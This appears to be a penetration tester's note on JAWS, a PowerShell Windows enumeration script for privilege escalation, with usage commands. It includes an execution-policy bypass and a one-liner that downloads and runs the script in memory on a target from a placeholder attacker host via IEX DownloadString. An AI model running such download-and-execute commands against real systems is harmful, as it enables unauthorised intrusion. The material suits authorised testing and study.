---
tags: [tool, privesc, windows, powershell]
tool: "jaws"
category: "Privesc"
installed: true
phase: [enumeration]
---

# JAWS - Just Another Windows Enum Script

## Tool Overview
Purpose: PowerShell script for Windows enumeration
Location: ~/tools/privesc/windows/jaws-enum.ps1

## When to Use
- When you need a quick Windows enum
- As a complement to winpeas
- When you want output in a specific format

## How to Use It

Basic Usage:
powershell -ep bypass
.\jaws-enum.ps1

Save Output:
powershell -ep bypass .\jaws-enum.ps1 -OutputFileName JAWS-Results.txt

Transfer to Target:
On Kali: cd ~/tools/privesc/windows && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/jaws-enum.ps1')"

## What It Finds
- System information
- User information
- Network information
- Service information
- Registry checks
- File system checks

## Related Tools
winpeas, powerup
